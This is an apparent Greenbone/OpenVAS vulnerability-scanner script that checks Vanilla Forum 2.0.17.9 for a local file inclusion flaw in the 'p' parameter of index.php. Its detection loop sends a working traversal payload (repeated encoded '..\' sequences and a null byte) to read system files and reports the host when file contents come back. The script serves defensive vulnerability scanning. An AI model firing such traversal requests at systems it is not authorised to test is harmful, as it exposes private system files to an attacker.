CPE = "cpe:/a:lussumo:vanilla";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801794" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Vanilla Forum Local File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_lussumo_vanilla_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Lussumo/Vanilla/detected" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17295/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/101448" );
	script_xref( name: "URL", value: "http://securityreason.com/wlb_show/WLB-2011050062" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to perform directory
  traversal attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "Vanilla Forum version 2.0.17.9" );
	script_tag( name: "insight", value: "The flaw is due to improper validation of user supplied data in
  'index.php' via 'p' parameter, which allows attackers to read arbitrary files via a ../(dot dot) sequences." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Vanilla Forum and is prone to local file
  inclusion vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/index.php?p=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c" + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

